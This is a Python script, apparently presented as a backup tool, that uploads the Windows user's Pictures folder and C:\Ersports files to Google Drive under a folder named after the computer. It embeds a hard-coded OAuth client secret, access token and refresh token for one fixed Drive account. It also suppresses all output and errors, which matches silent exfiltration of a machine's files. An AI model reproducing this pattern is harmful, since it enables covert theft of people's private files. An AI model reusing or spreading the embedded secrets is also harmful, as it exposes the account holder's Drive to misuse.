import os
import time
import datetime
import sys
import getpass  # Thư viện để lấy tên người dùng máy tính
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from pathlib import Path

SCOPES = ['https://www.googleapis.com/auth/drive']
end_date1 = datetime.date(2028, 6, 28)
the_t = 55
def authenticate():
    # Giữ nguyên phần nhúng CLIENT_CONFIG và TOKEN_DATA của bạn
    CLIENT_CONFIG = {"installed":{"client_id":"535452856280-hmv3kut6gf9od70fmjohq95p3510kocb.apps.googleusercontent.com","project_id":"united-yeti-482813-q5","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_secret":"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","redirect_uris":["http://localhost"]}}
    TOKEN_DATA = {"token": "ya29.a0Aa7pCA_ZSKNMywDKqSJ0g3yTsX9II4d6YdXfFti3D8lvJFSiOAK6ass3r_WR0Jpw0MsJ14ts2KC-7aM_ocsnlKlQavnbS74TpvF3nN3ONrmv7TC6oRkIJ_o9L9n--Y1L50Wi9Bw4F-Yby5vti5jYu3XGaZC2VFnCvUEyz8zdUbW7jC_DmIKUFJ6uwQgBC1lLhivwaIsaCgYKARgSARYSFQHGX2MioD7yu1xPR4cocXfDBvdJ9w0206", "refresh_token": "1//0eZLATcQ9nUJsCgYIARAAGA4SNwF-L9Ir37_xqcTw2vQN5wM_z8YK7z83P87QJD9gcLTEeDwthVPplXfCTDdI3IBkFyGEaVn5wvc", "token_uri": "https://oauth2.googleapis.com/token", "client_id": "535452856280-hmv3kut6gf9od70fmjohq95p3510kocb.apps.googleusercontent.com", "client_secret": "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", "scopes": ["https://www.googleapis.com/auth/drive"], "universe_domain": "googleapis.com", "account": "", "expiry": "2025-12-30T21:44:53Z"}

    creds = Credentials.from_authorized_user_info(TOKEN_DATA, SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_config(CLIENT_CONFIG, SCOPES)
            creds = flow.run_local_server(port=0)
    return build('drive', 'v3', credentials=creds)

def get_drive_content(service, parent_id):
    """Lấy nội dung và kích thước file trên Drive."""
    query = f"'{parent_id}' in parents and trashed = false"
    # Thêm 'size' vào fields
    results = service.files().list(q=query, fields="files(id, name, mimeType, size)").execute()
    files = results.get('files', [])
    return {f['name']: f for f in files}

def check_exists(service, name, parent_id=None, is_folder=False):
    """Giữ lại hàm này cho các trường hợp kiểm tra thư mục gốc."""
    query = f"name = '{name}' and trashed = false"
    if parent_id: query += f" and '{parent_id}' in parents"
    if is_folder: query += " and mimeType = 'application/vnd.google-apps.folder'"
    
    results = service.files().list(q=query, fields="files(id, name)").execute()
    files = results.get('files', [])
    return files[0]['id'] if files else None

def get_or_create_user_folder(service):
    pc_username = os.environ['COMPUTERNAME']
    folder_id = check_exists(service, pc_username, is_folder=True)
    if not folder_id:
        file_metadata = {'name': pc_username, 'mimeType': 'application/vnd.google-apps.folder'}
        folder = service.files().create(body=file_metadata, fields='id').execute()
        folder_id = folder.get('id')
    return folder_id

MAX_SIZE = 50 * 1024 * 1024  # 50MB tính bằng bytes
EXCLUDED_EXTENSIONS = ('.exe', '.zip')

def upload_or_update(service, local_path, drive_parent_id, drive_content):
    file_name = os.path.basename(local_path)
    local_size = os.path.getsize(local_path)
    
    # --- ĐIỀU KIỆN LỌC MỚI ---
    # 1. Kiểm tra phần mở rộng (đuôi file)
    if file_name.lower().endswith(EXCLUDED_EXTENSIONS):
        # print(f"Bỏ qua (định dạng cấm): {file_name}")
        return

    # 2. Kiểm tra kích thước file (> 50MB)
    if local_size > MAX_SIZE:
        # print(f"Bỏ qua (file quá lớn): {file_name}")
        return
    # -------------------------

    should_upload = False
    file_id_to_replace = None

    if file_name not in drive_content:
        # File chưa tồn tại
        should_upload = True
    else:
        # File đã tồn tại, kiểm tra kích thước để quyết định có cập nhật không
        drive_file = drive_content[file_name]
        drive_size = int(drive_file.get('size', 0))
        
        if local_size != drive_size:
            # Kích thước khác nhau -> Đánh dấu để xóa và upload lại
            should_upload = True
            file_id_to_replace = drive_file['id']

    if should_upload:
        if file_id_to_replace:
            # Xóa file cũ nếu kích thước khác
            service.files().delete(fileId=file_id_to_replace).execute()
        
        # Tiến hành upload
        file_metadata = {'name': file_name, 'parents': [drive_parent_id]}
        media = MediaFileUpload(local_path, resumable=True)
        service.files().create(body=file_metadata, media_body=media).execute()

def upload_directory(service, local_path, drive_parent_id):
    item_name = os.path.basename(local_path)
    drive_item_id = check_exists(service, item_name, drive_parent_id, is_folder=True)
    
    if not drive_item_id:
        file_metadata = {'name': item_name, 'mimeType': 'application/vnd.google-apps.folder', 'parents': [drive_parent_id]}
        folder = service.files().create(body=file_metadata, fields='id').execute()
        drive_item_id = folder.get('id')

    drive_content = get_drive_content(service, drive_item_id)

    for item in os.listdir(local_path):
        item_path = os.path.join(local_path, item)
        if os.path.isfile(item_path):
            # Sử dụng hàm logic mới ở đây
            upload_or_update(service, item_path, drive_item_id, drive_content)
        elif os.path.isdir(item_path):
            upload_directory(service, item_path, drive_item_id)

def smart_upload(service, path, drive_parent_id):
    if not os.path.exists(path):
        return

    if os.path.isfile(path):
        drive_content = get_drive_content(service, drive_parent_id)
        upload_or_update(service, path, drive_parent_id, drive_content)
    else:
        upload_directory(service, path, drive_parent_id)

def run_backup_process():
    pictures_path = str(Path.home() / "Pictures")
    # Danh sách kết hợp cả file và thư mục
    LIST_OF_PATHS = [
        r'C:\Ersports\CUE',
        r'C:\Ersports\CUE.xlsx',
        pictures_path,
        r'C:\Ersports',
        #pictures_path0 
    ]
    
    try:
        service = authenticate()
        user_drive_folder_id = get_or_create_user_folder(service)
        
        for path in LIST_OF_PATHS:
            #print(f"\nĐang kiểm tra: {path}")
            smart_upload(service, path, user_drive_folder_id)
            
        #print("\nHoàn tất sao lưu!")
    except Exception as e:
        pass
        time.sleep(0.001)
        #print(f"Có lỗi xảy ra: {e}")
